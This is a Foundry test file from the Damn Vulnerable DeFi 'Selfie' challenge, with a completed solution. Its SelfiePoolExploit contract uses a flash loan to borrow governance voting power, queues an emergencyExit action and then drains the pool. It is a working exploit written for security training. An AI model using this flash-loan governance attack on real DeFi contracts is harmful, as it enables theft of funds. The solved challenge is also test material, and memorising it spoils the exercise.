// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfiePoolExploit is IERC3156FlashBorrower {
    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;
    address recovery;
    uint256 actionId;

    constructor(
        address _token,
        address _governance,
        address _pool,
        address _recovery
    ) {
        token = DamnValuableVotes(_token);
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        recovery = _recovery;
    }

    function attack() external {
        // 1. flash loan all tokens from the pool
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), TOKENS_IN_POOL, "");

    }

    function onFlashLoan(address , address, uint256, uint256, bytes calldata) external returns (bytes32) {
        // 2. delegate all votes to this contract
        token.delegate(address(this));
        
        // 3. queue action to drain the pool
        bytes memory emergencyActionFunction = abi.encodeWithSignature(
            "emergencyExit(address)",
            recovery
        );
        actionId = governance.queueAction(address(pool), 0, emergencyActionFunction);
        
        // 4. approve the pool to transfer tokens and return success message
        token.approve(address(pool), TOKENS_IN_POOL);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAction() external {
        // 5. execute action after the delay
        governance.executeAction(actionId);
    }
}

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        SelfiePoolExploit exploit = new SelfiePoolExploit(
            address(token),
            address(governance),
            address(pool),
            recovery
        );
        exploit.attack();
        vm.warp(block.timestamp + governance.getActionDelay());
        exploit.executeAction();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
